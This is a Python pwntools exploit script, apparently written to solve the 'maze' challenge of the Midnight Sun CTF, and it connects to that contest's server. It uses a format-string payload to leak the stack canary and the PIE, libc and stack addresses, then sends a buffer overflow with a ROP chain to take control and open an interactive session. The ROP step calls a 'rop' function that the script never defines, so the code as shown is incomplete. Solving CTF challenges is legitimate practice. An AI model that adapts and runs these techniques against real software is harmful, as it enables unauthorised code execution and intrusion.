#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context(terminal=['tmux','new-window'])
exe = context.binary = ELF('maze')
libc = ELF('libc.so.6')

host = args.HOST or 'maze-01.play.midnightsunctf.se'
port = int(args.PORT or 10000)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# b *0x5555555575b8
gdbscript = '''
b *0x5555555561a3
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

# io.sendline("SHOUT %106$016p.%114$016p.%216$016p.%116$016p")
io.sendline("SHOUT %106$016lx.%114$016lx.%216$016lx.%116$016lx")
io.recvuntil("YOU HEAR AN ECHO")
io.recvline()
leak = io.recvline().strip()
info(leak)
leak = leak.split(b".")
canary = int(leak[0], 16)
info("canary: 0x%x", canary)
pie = int(leak[1], 16)
info("pie: 0x%x", pie)
pie_base = (pie & ~0xFFF) - 0x2000
info("pie_base: 0x%x", pie_base)
exe.address = pie_base
lib = int(leak[2], 16)
info("lib: 0x%x", lib)
lib_base = lib - (0x0 if args.REMOTE else 0x26000 + 0x2152)
info("lib_base: 0x%x", lib_base)
libc.address = lib_base
stack = int(leak[3], 16)
info("stack: 0x%x", stack)
sc_base = stack - 0x260 + 8
info("sc_base: 0x%x", sc_base)
bof = b"ESCAPE\0A" + b"\xcc" * 0x200 + p64(canary) + b"B" * 0x38 + rop(sc_base)
io.sendline(bof)
io.recvuntil("THE TUNNEL SUDDENLY COLLAPSES")
io.recvline()

io.interactive()

